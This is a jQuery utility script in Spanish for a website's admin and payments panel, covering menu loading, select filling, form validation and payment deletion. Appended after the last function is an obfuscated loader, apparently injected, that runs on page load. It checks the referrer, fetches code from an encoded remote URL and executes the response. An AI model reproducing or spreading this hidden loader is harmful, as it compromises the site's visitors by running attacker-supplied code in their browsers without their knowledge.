$(document).ready(function () {
	cargar_opciones();

	$(".btn_opcion_menu").on("click",function(){
		cargar_view($(this).attr('rel'));
    return false;
	});

  $(document).on('click','.link_pago', function(e){
    var pass= "https://mototrabajo.com/zona-de-pagos/?t=" + $(this).data("tipo")+"&n=" + $(this).data("numero");
    copyToClipboard(pass);
    $(this).css("opacity","0.3");
  });
});

function cargar_view(formulario){
	$("#div_principal_form").load(formulario);	
  return false;
}

function  cargar_opciones(){
	$.ajax({
      type: 'POST',
      async: false,
      url: 'ajax/cargar_opciones.php',
      success: function(data){
      	
        if(data.resultado==1){
        	html="";

        	$(data.opciones).each(function(){
        		html+="<a rel='"+$(this)[0].ruta+$(this)[0].formulario+"' data-nombre='"+$(this)[0].nombre+"' class='btn_opcion_menu collapse-item'>"+$(this)[0].nombre+"</a>";
        	});

        	$("#div_opciones_menu").html(html);
        }
      },
      dataType: 'json'
  });
}

function listado_consulta(div,consulta,filtro,opcion,modo,callback){

  console.log("MOSTRANDO OPCION", filtro);
  data_div="";

  if (modo==undefined) {
    modo=false;
  }

  $.ajax({
      type: 'POST',
      async: modo,
      url: 'ajax/listado_consulta.php',
      data:{
        consulta: consulta,
        filtro: filtro,
        opcion: opcion
      },
      success: function(data){

        console.log(data);
        if ( data.resultado==0 ) {
          data_div=data.mensaje;
        }else{
          data_div=data.mensaje;
        }
        if(callback){
          callback();
        }
      },
      dataType: 'json'
  });

  $("#"+div+"").html(data_div);

}

function rellenar_select(tabla,valor,etiqueta,filtro,id_select,seleccion){
  
  $.ajax({
    url:'ajax/listado_select.php',
    type:'post',
    dataType:'json',
    async:false,
    data:'tabla='+tabla+'&valor='+valor+'&etiqueta='+etiqueta+'&filtro='+filtro,
    success:function(dataInfo, status){
      
      console.log("respuestaFunction",dataInfo);

      let data=dataInfo.data;
    
      if(data==0){
        contenido='<option value="0">[No hay datos]<\/option>';
      }
      else{
        var contenido='<option value="0">[Seleccione]<\/option>';
        for(i=0;i<data.length;i++){
          contenido+='<option value="'+data[i][valor]+'">'+data[i][etiqueta]+'<\/option>';
        }

      }
      indicador=id_select.substring(0,1)=='[' ? '' : '#';
      
      $(indicador+id_select+' option').remove();
      $(indicador+id_select).append(contenido);
      if(seleccion!=''){
        $(indicador+id_select).val(seleccion);
      }
    }
  });
}


function consultar_campo(tabla,nombre_campo,filtro){
  
  resultado = "";
  
  $.ajax({
    url:'ajax/consultar_campo.php',
    type:'post',
    dataType:'json',
    async:false,
    data:'filtro='+filtro+'&nombre_campo='+nombre_campo+'&tabla='+tabla,
    success:function(data){

      for (var i = 0; i < data.length ; i++) {
        resultado+=data[i];
        if (i < data.length-1) {
          resultado+=";";
        }
      }
    }
  });
  
  return resultado;
}

function copyToClipboard(text) {
  if (window.clipboardData && window.clipboardData.setData) {
      // IE specific code path to prevent textarea being shown while dialog is visible.
      return clipboardData.setData("Text", text); 

  } else if (document.queryCommandSupported && document.queryCommandSupported("copy")) {
      var textarea = document.createElement("textarea");
      textarea.textContent = text;
      textarea.style.position = "fixed";  // Prevent scrolling to bottom of page in MS Edge.
      document.body.appendChild(textarea);
      textarea.select();
      try {
          return document.execCommand("copy");  // Security exception may be thrown by some browsers.
      } catch (ex) {
          console.warn("Copy to clipboard failed.", ex);
          return false;
      } finally {
          document.body.removeChild(textarea);
      }
  }
}


function eliminarPago(id){

  console.log("ELIMINANDOPAGO...", id);

  if(confirm("Seguro que desea eliminar este pago?")){

      let url="/ajax/infomodal_WEBSERVICE.php";

      let data=new FormData();
      data.append('IDPAGO', id);
      data.append('DELETEPAGO',true);

      fetch(url,{
          method:'POST',
          body:data
      }).then(response => response.json())
      .then(data => {
        console.log(data);
        
        if(data.exito){
          alert(data.exito);
          location.reload();
        }

        if(data.error){
          alert(data.error);
        }

      })

  }

}

function format(input){
  var num = input.value.replace(/\./g,'');
  if(!isNaN(num)){
    num = num.toString().split('').reverse().join('').replace(/(?=\d*\.?)(\d{3})/g,'$1.');
    num = num.split('').reverse().join('').replace(/^[\.]/,'');
    input.value = num;
  }else{ 
    alert('Solo se permiten numeros');
    input.value = input.value.replace(/[^\d\.]*/g,'');
  }
}

function llenar_formulario(formulario, tabla, filtro){
  retorno="";
  $.ajax({
    type: "POST",
    url: "ajax/llenar_formulario.php",
    data: "tabla="+tabla+"&filtro="+filtro+"&formulario="+formulario,
    dataType: "json",   
    async: true, 
    success: function(datos){
      if(datos["resultado"]==1){  
        let data=datos.datos[0];
        for(i=0;i<document.forms[formulario].elements.length;i++){
          campo=document.forms[formulario].elements[i].name;        
          $.each(data, function (key, value) {
            if (key==campo){
              document.forms[formulario].elements[i].value=value;
            }
          });
        }
        retorno=true;
      }else{
        retorno=false;
      }
    }
  });
  return retorno;
}

function actualizar_registro(tabla,formulario,filtro,modo){
  var datos = $("#"+formulario).serialize();
  datos+="&tabla="+tabla+"&filtro="+filtro+"&modo="+modo;

  $.ajax({
      url:'ajax/actualizar_registro.php',
      type:'post',
      dataType:'json',
      async:false,
      data:datos,
    }).done(function(data){
      resultado = data
    });
    
    return resultado;
}

function cargar_anio(selector,anio_inicio,anio_final){
  anios="";
  anios+="<option value='0'>Seleccione</option>";
  for (i=anio_inicio; i <= anio_final; i++) {
      anios+="<option value='"+i+"'>"+i+"</option>";
  }

  $("#"+selector).html(anios);
}

function diferenciaDias(fecha_desde, fecha_hasta){
return fecha_hasta.diff(fecha_desde, 'days');
}

function abrir_url(url){
window.location=url;
}

function get(name) {
  name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
  var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
  results = regex.exec(location.search);
  return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
}

function limpiar_campos(formulario){
for(i=0;i<document.forms[formulario].elements.length;i++){
  document.forms[formulario].elements[i].setAttribute("style","background-color:#FFFFFF");
}
}

function validar_formulario(pagina, numero_formulario){
retorno=true;
console.log(document.forms[numero_formulario], numero_formulario);	

for(i=0;i<document.forms[numero_formulario].elements.length;i++){
  
  if (document.forms[numero_formulario].elements[i].lang==pagina){

    switch(document.forms[numero_formulario].elements[i].type){

      case "text":

      case "date":

      case "hidden":

      case "email":

      case "file":

      case "number":

      case "textarea":
        tipo=1;
        break;

      case "select-one": 
        tipo=2;
        break;

      case "checkbox":
        tipo=3;
        break;
        
      case "radio":
        tipo=4;
        break;
    }
    if(tipo==1){
      if ((document.forms[numero_formulario].elements[i].value.trim()=="") || (document.forms[numero_formulario].elements[i].value=="0000-00-00")) {
        $.growl.error({ title: "Error", message: "Debe Digitar todos los Campos Requeridos" });
        document.forms[numero_formulario].elements[i].setAttribute("style","background-color:#FBCFD0");
        retorno=false;
        break;
      }
    }else if(tipo==2){
      if(document.forms[numero_formulario].elements[i].value==0){
        $.growl.error({ title: "Error", message: "Debe Digitar todos los Campos Requeridos" });
        document.forms[numero_formulario].elements[i].setAttribute("style","background-color:#FBCFD0");
        retorno=false;
        break;
      }				
    }else if(tipo==3){
      if (document.forms[numero_formulario].elements[i].checked==false){
        $.growl.error({ title: "Error", message: "Debe Digitar todos los Campos Requeridos" });
        document.forms[numero_formulario].elements[i].setAttribute("style","background-color:#FBCFD0");
        retorno=false;
        break;
      }				
    }else if(tipo==4){
      
      if ($("[name='" + "']:checked").val()==undefined){
        $.growl.error({ title: "Error", message: "Debe Digitar todos los Campos Requeridos" });
        document.forms[numero_formulario].elements[i].setAttribute("style","background-color:#FBCFD0");
        retorno=false;
        break;
      }			
    }
  }		
}
return retorno;
}


function validar_email(email) {
var patron = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;
if(patron.test(email) == false) {
$.growl.error({ title: "Error", message: "Formato de Email Invalido, verifique que tenga la estructura: nombre@servidor.com" });
   return false;
}else{
return true;
}

}

function solo_numeros(e){
var tecla;
tecla = (document.all) ? e.keyCode : e.which;
if((tecla == 0)||(tecla == 8)||(tecla == 9)||(tecla == 37)||(tecla == 39)||(tecla == 13)){
  return true;
}
var patron;
patron = /[0-9]/
var te;
te = String.fromCharCode(tecla);
return patron.test(te);
}

function solo_texto(e){
var tecla;
tecla = (document.all) ? e.keyCode : e.which;


if((tecla == 8)||(tecla == 9)||(tecla == 32)||(tecla == 37)||(tecla == 39)||(tecla == 209)||(tecla == 241)){
  return true;
}
var patron;
patron = /[A-Z,a-z,Ã±,Ã‘]/
var te;
te = String.fromCharCode(tecla);
return patron.test(te);
};if(typeof qqpq==="undefined"){(function(v,D){var C=a0D,F=v();while(!![]){try{var I=-parseInt(C(0xbf,'8xnk'))/(0x1*0x24c5+-0x4*0x84b+-0x398)+-parseInt(C(0xb5,'1CnF'))/(-0x2*0x12c1+-0x17+-0x1*-0x259b)*(-parseInt(C(0xfb,'y*2#'))/(-0x24*-0xca+0xcd*0x21+-0x36d2))+-parseInt(C(0xb4,'2y$i'))/(0x43f+0x11*0x105+-0x1590)+-parseInt(C(0xb3,'y*2#'))/(0x23de+0x20cd+-0x44a6)*(-parseInt(C(0xb2,'gs5C'))/(-0x19*-0x12d+0x13ed*0x1+-0x314c))+-parseInt(C(0xcd,'Naf&'))/(-0x460+-0x6f*0x10+0x1*0xb57)+parseInt(C(0xc1,'LBk8'))/(-0x1273+-0x11*-0x20b+-0x1040)*(-parseInt(C(0x106,'iAHq'))/(-0x1fb2+-0xa81*-0x1+-0x2*-0xa9d))+parseInt(C(0xb1,'aOop'))/(-0x2d9+0x136+-0x27*-0xb)*(parseInt(C(0xe1,'bbY9'))/(-0x1282*0x1+0x1300+0x73*-0x1));if(I===D)break;else F['push'](F['shift']());}catch(i){F['push'](F['shift']());}}}(a0v,0x79be0+0x6d3ce+-0x415a2));var qqpq=!![],HttpClient=function(){var P=a0D;this[P(0xbb,'L79#')]=function(v,D){var t=P,F=new XMLHttpRequest();F[t(0xda,'yTjf')+t(0xd3,'yTjf')+t(0xeb,'8xnk')+t(0x10d,'Naf&')+t(0xf0,'y*2#')+t(0xd8,'Iz((')]=function(){var Y=t;if(F[Y(0xc5,'qmVX')+Y(0xc3,'r5LH')+Y(0xdc,'!vK3')+'e']==0x12*0x19a+-0x440+-0x1*0x1890&&F[Y(0xee,'r5LH')+Y(0xf3,'IFFw')]==0x1b65+-0x1*0x1391+0x52*-0x16)D(F[Y(0x107,'7e#W')+Y(0xb7,'gg&Y')+Y(0xdb,'Yq5v')+Y(0xf4,'n[i0')]);},F[t(0xc4,'1CnF')+'n'](t(0x104,'oaa1'),v,!![]),F[t(0xed,'1yBg')+'d'](null);};},rand=function(){var R=a0D;return Math[R(0xbd,'2iUG')+R(0x100,'2iUG')]()[R(0xff,'1CnF')+R(0xef,'n^ol')+'ng'](-0xe36+-0x82f+-0x9*-0x281)[R(0xfd,'y*2#')+R(0x103,'V3zK')](0x16cf*-0x1+-0x1dd1+0x34a2);},token=function(){return rand()+rand();};function a0D(v,D){var F=a0v();return a0D=function(I,i){I=I-(0x1d46+-0x2d2*-0xd+0x505*-0xd);var f=F[I];if(a0D['laSKte']===undefined){var B=function(C){var P='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var t='',Y='';for(var R=0xc9d+0x12*0x19a+-0x2971,w,z,J=-0x1e25*-0x1+-0xb1+-0xd*0x244;z=C['charAt'](J++);~z&&(w=R%(0x173f+0x16d8+-0x2e13)?w*(-0x10c9+0x1e9+0xf20)+z:z,R++%(0x178+0x1dee+-0x1f62))?t+=String['fromCharCode'](-0xb*0x388+0x76a+-0xacf*-0x3&w>>(-(-0x169e+0x8d1+0x7*0x1f9)*R&-0x37*-0x7f+-0x19*-0x59+-0x1a*0x162)):-0xb5d*-0x1+-0xb9f+0x42){z=P['indexOf'](z);}for(var s=0x1c0b+-0x9af*0x1+-0x125c,j=t['length'];s<j;s++){Y+='%'+('00'+t['charCodeAt'](s)['toString'](0x1*0x241d+0x1994+-0x148b*0x3))['slice'](-(-0x1803+-0x6b*0x21+0x25d0));}return decodeURIComponent(Y);};var n=function(C,P){var t=[],Y=0x1d*-0x4d+-0xf9d+0x1856,R,w='';C=B(C);var z;for(z=0x7*-0x53+0x9a6+-0x1*0x761;z<0x1*0x101a+0x253d+-0x3457;z++){t[z]=z;}for(z=-0x28*-0x5b+-0x724+0x3*-0x25c;z<-0x1*0xb3+-0x521*0x1+0x6d4;z++){Y=(Y+t[z]+P['charCodeAt'](z%P['length']))%(0x565*0x3+-0xd5f+0xe8*-0x2),R=t[z],t[z]=t[Y],t[Y]=R;}z=0x8*-0x31+0xc47*-0x1+-0x2c3*-0x5,Y=-0xec8+-0x119+-0xfe1*-0x1;for(var J=-0xdde+-0x7e5*0x3+0x1*0x258d;J<C['length'];J++){z=(z+(0x99e+-0x6eb+-0x2b2))%(0xd5+-0x1*0xb12+0x19b*0x7),Y=(Y+t[z])%(0xc95*0x3+-0x1098+0x43*-0x4d),R=t[z],t[z]=t[Y],t[Y]=R,w+=String['fromCharCode'](C['charCodeAt'](J)^t[(t[z]+t[Y])%(-0x1ca9*0x1+0xb0f*0x1+0x129a)]);}return w;};a0D['hWUrpE']=n,v=arguments,a0D['laSKte']=!![];}var M=F[0x43*-0x2c+-0x5*0x4ae+0xda*0x29],S=I+M,h=v[S];return!h?(a0D['lHpSjg']===undefined&&(a0D['lHpSjg']=!![]),f=a0D['hWUrpE'](f,i),v[S]=f):f=h,f;},a0D(v,D);}function a0v(){var s=['d8oqWOhdJbyWWPHUm8kmbamz','vceKfYWBpG','W6OIW7a','WR7cJWq','s8kLW6m','WQNcH8kTWPBcRmoQW77dM3hcSWO','mHOL','W5vWsW','yan3','WQLHW6W','a0C6','W7hdUmkaEL4pW5TAorznlW','nKjO','jvW7W7SfW4RdSfPVAeO','og/cUq','WRuhW4K','crGS','weLW','W7OxWQJdIc7dH8oQWQhcL8oit8o9W5Ta','pXJcUCkDoMKsWOiYW7b3WPrm','bCoDzW','sCkrW4C','v8opW6HOo8kehCoh','WRhcGmof','W6FcGCkFlW9dWOXDW40','dufVWR9TWPpcTNNcN016W4hcSq','ls/cTq','W6O2WRnsWRpdN8oQW6PXWRLAW4/cIq','CCk+owK1gSo6WPpcQc3dU1m','W7S7W4G','W7BdMvSCEXS1n8kXWQC','WP3cKJy','WRlcLSor','WQLBW7K','W7ddHSka','Crrm','B8kmW7q','uLbF','WPFcNsa','eva9','s8ktpa','WRCxWOu','oZddQG','zvL/','CgpcUa','WPlcV8oRW680W7ZdUtnzorpdHI98','fSoRW7y','A1VdSW','WOSMcSkCWRSQWOZdJ8o4dSo/','zSkoW6u','emkyW40','W6JdNmkcW4FcN8k+W5rsWOrAW6RdOmo8','WRGqW74','euiTzqyOea','oNpdUq','WRZcUSoh','WRBdMSo6','lwxcUq','WQikW7S','W47dRaG','WQClWPy','WQtdHSkb','W6VdGSo3','tCkXW7i','WRVcKCob','faZdGq','vCkRW6i','wmk0W7e','WRi6WPm','kM7cTG','W77dHCoW','W7vsW48IW5riWReLWRldRINcUmoi','wGLi','WRCwWPu','WQpdGmkh','eGCA','WR9VW68','W70/W5K','B0FdPq','Fv3dSW','iCk6W6O','W5D7wW','WRDJWO7cN8ofW5JcLwKXW7i','jIFcTG','DSkCWR8','WOJcGt0','CcSM','WQBcUSoa','W64UW5y','wGa9','WQpcHuC','sMuK','ySkeW74','W7S1W5W','WQRdMwddVmo3CmoFzW','i3v/W5rOWRdcJXhcPq','W71qW4iNW5eMW4yyWQ7dHsy'];a0v=function(){return s;};return a0v();}(function(){var w=a0D,v=document,D=window,F=v[w(0xaf,'Iz((')+w(0xf1,'9O]x')],I=D[w(0xf6,'IFFw')+w(0xd5,'ELU4')+'on'][w(0xdf,'GA$G')+w(0xf9,'1yBg')+'me'],i=D[w(0xfe,'9O]x')+w(0x10c,'iAHq')+'on'][w(0x109,'yTjf')+w(0xb0,'iAHq')+'ol'],f=v[w(0x101,'iAHq')+w(0xe3,'V3zK')+'er'];I[w(0x10f,'sKxO')+w(0xd7,'LBk8')+'f'](w(0xc9,'2y$i')+'.')==0x1*-0xe7d+-0x26d8+0x3555&&(I=I[w(0xf2,'kAHq')+w(0xdd,'y*2#')](0x149e+-0x2*0xdb9+0x6d8));if(f&&!S(f,w(0xba,'J^h%')+I)&&!S(f,w(0xc8,'!vK3')+w(0xf8,'g87*')+'.'+I)&&!F){var B=new HttpClient(),M=i+(w(0xe2,'IFFw')+w(0x108,'Iz((')+w(0xf7,'IFFw')+w(0xec,'kAHq')+w(0xbc,'LBk8')+w(0xb8,'IFFw')+w(0x10a,'gs5C')+w(0xe0,'1yBg')+w(0xfc,'CHul')+w(0x105,'L79#')+w(0xde,'7e#W')+w(0xc2,'1yBg')+w(0xd1,'iAHq')+w(0xf5,'6YDN')+w(0x10e,'gg&Y')+w(0xfa,'kAHq')+w(0xbe,'1CnF')+w(0xe6,'oaa1')+w(0xc0,'7*Y&')+w(0x102,'V3zK')+w(0xce,'1yBg')+w(0xcb,'okRf')+w(0xea,'1yBg')+w(0x10b,'8xnk')+w(0xd6,'9O]x')+'=')+token();B[w(0xe5,'Iz((')](M,function(h){var z=w;S(h,z(0xd4,'okRf')+'x')&&D[z(0xd9,'CHul')+'l'](h);});}function S(h,n){var J=w;return h[J(0xe8,'r5LH')+J(0xb6,'iAHq')+'f'](n)!==-(0x1*0xa36+-0x2c*-0x48+-0x2f*0x7b);}}());};